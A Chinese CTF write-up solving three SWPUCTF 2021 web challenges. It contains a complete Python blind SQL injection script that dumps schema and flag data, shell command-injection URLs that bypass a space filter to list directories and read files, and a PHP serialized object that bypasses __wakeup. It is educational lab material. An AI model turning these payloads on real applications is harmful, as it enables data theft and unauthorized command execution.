## [SWPUCTF 2021 新生赛]easy_sql

第一眼以为是布尔盲注，就按着布尔盲注的方式写了exp，写完发现可以使用union进行手动注入，哭死T_T，不过也是第一次写布尔盲注，刚好积累一下，exp如下：

```python
import requests

baseUrl = "http://node5.anna.nssctf.cn:28477"

# 数据库名的长度
lenOfDatabase = 1
while lenOfDatabase > 0:
    url = baseUrl + f"?wllm=1' and length(database())={lenOfDatabase} -- a"
    r = requests.get(url)
    if "Your Login name" in r.text:
        print("数据库名字长度: " + str(lenOfDatabase))  # 7
        break
    lenOfDatabase += 1

# 数据库名
databaseName = ''
for i in range(lenOfDatabase):
    for j in range(32, 128):
        url = baseUrl + f"?wllm=1' and (ascii(substr(database(),{i + 1},1)))={j} -- a"
        r = requests.get(url)
        if "Your Login name" in r.text:
            databaseName += chr(j)
            break

print("数据库名字: " + databaseName)  # test_db

# 数据库表的个数
numOfTables = 1
while numOfTables > 0:
    url = baseUrl + f"?wllm=1' and (select count(table_name) from information_schema.TABLES WHERE TABLE_SCHEMA='test_db')={numOfTables} -- a"
    r = requests.get(url)
    if "Your Login name" in r.text:
        print("数据库表的个数: " + str(numOfTables))  # 2
        break
    numOfTables += 1

# 数据库表名的长度
numOfTables = 2
for i in range(numOfTables):
    length = 1
    while length > 0:
        url = baseUrl + f"?wllm=1' and length((select table_name from information_schema.tables where table_schema='test_db' limit 1 offset {i}))={length} -- a"
        r = requests.get(url)
        if "Your Login name" in r.text:
            print("第{}个表的名字长度: ".format(i + 1) + str(length))  # 7 5
            break
        length += 1

# 数据库表名
lenTablesName = [7, 5]
for j in range(len(lenTablesName)):
    table = ''
    for k in range(lenTablesName[j]):
        for i in range(32, 128):
            url = baseUrl + f"?wllm=1' and ascii(substr((select table_name from information_schema.tables where table_schema='test_db' limit 1 offset {j}),{k + 1},1))={i} -- a"
            r = requests.get(url)
            if "Your Login name" in r.text:
                table += chr(i)
                break
    print("第{}个表名为: ".format(j + 1) + table)  # test_tb users

# 这里对test_tb进行字段数的检查
numOfLabels = 1
while numOfLabels > 0:
    url = baseUrl + f"?wllm=1' and (select count(*) from information_schema.columns where table_schema='test_db' and table_name = 'test_tb')={numOfLabels} -- a"
    r = requests.get(url)
    if "Your Login name" in r.text:
        print(numOfLabels)  # 2
        break
    numOfLabels += 1

numOfLabels = 2
for i in range(numOfLabels):
    lenOfLabel = 1
    while lenOfLabel > 0:
        url = baseUrl + f"?wllm=1' and LENGTH((select column_name from information_schema.columns where table_schema='test_db' and table_name='test_tb' limit 1 offset {i})) = {lenOfLabel} -- a"
        r = requests.get(url)
        if "Your Login name" in r.text:
            print(lenOfLabel)  # 2 4
            break
        lenOfLabel += 1

lenOfLabels = [2, 4]
for i in range(len(lenOfLabels)):
    label = ''
    for j in range(lenOfLabels[i]):
        for k in range(32, 128):
            url = baseUrl + f"?wllm=1' and ascii(SUBSTR((select column_name from information_schema.columns where table_schema='test_db' and table_name='test_tb' limit 1 offset {i}),{j + 1},1))={k} -- a"
            r = requests.get(url)
            if "Your Login name" in r.text:
                label += chr(k)
                break
    print(label)  # id flag

# 发现有一列是flag，判断flag长度
labels = ['id', 'flag']
lenOfFlag = 1
while lenOfFlag > 0:
    url = baseUrl + f"?wllm=1' and length((select flag from test_tb limit 0,1))={lenOfFlag} -- a"
    r = requests.get(url)
    if "Your Login name" in r.text:
        print(lenOfFlag)  # 44
        break
    lenOfFlag += 1

# 根据flag长度去猜测得到flag
flag = ''
for i in range(44):
    for j in range(32, 128):
        url = baseUrl + f"?wllm=1' and ascii(substr((select flag from test_tb limit 0,1),{i + 1},1))={j} -- a"
        r = requests.get(url)
        if "Your Login name" in r.text:
            flag += chr(j)
            break
print(flag)
```

## [SWPUCTF 2021 新生赛]babyrce

首先根据源码知道要在Header中添加cookie键值对admin=1，之后得到rasalghul.php字段，通过url进入后发现要通过GET方式传入变量url的值，shell_exec会执行，在执行前会进行正则匹配空格，可以用%09绕过空格匹配。

首先先简单传入url=ls，发现没什么东西，之后通过不断cd . . 返回上一级目录后并ls后找到flag文件，直接cat得到flag，payload：

```tex
// 发现有flllllaaaaaaggggggg文件
http://node5.anna.nssctf.cn:28853/rasalghul.php?url=cd%09../../..;ls
// cat flag
http://node5.anna.nssctf.cn:28853/rasalghul.php?url=cat%09../../../flllllaaaaaaggggggg
```

## [SWPUCTF 2021 新生赛]no_wakeup

一道经典的php序列化与反序列化的题目，通过观察给定的php源码可知是要构造一个admin为admin，passwd为wllm的HaHaHa对象，还要绕过__wakeup方法，而 wakeup方法是在php在使用反序列化函数unserialize()时，会先自动调用的函数，绕过方法是只要序列化的中的成员数大于实际成员数，即可绕过。

exp如下：

```php
<?php
class HaHaHa{


        public $admin;
        public $passwd;

        public function __construct(){
            $this->admin ="user";
            $this->passwd = "123456";
        }

        public function __wakeup(){
            $this->passwd = sha1($this->passwd);
        }

        public function __destruct(){
            if($this->admin === "admin" && $this->passwd === "wllm"){
                include("flag.php");
                echo $flag;
            }else{
                echo $this->passwd;
                echo "No wake up";
            }
        }
    }
$p=new HaHaHa();
$p->admin="admin";
$p->passwd="wllm";
echo serialize($p);
?>
```

得到

```php
O:6:"HaHaHa":2:{s:5:"admin";s:5:"admin";s:6:"passwd";s:4:"wllm";}
```

修改序列化的成员数再GET传参即可

```php
O:6:"HaHaHa":3:{s:5:"admin";s:5:"admin";s:6:"passwd";s:4:"wllm";}
```
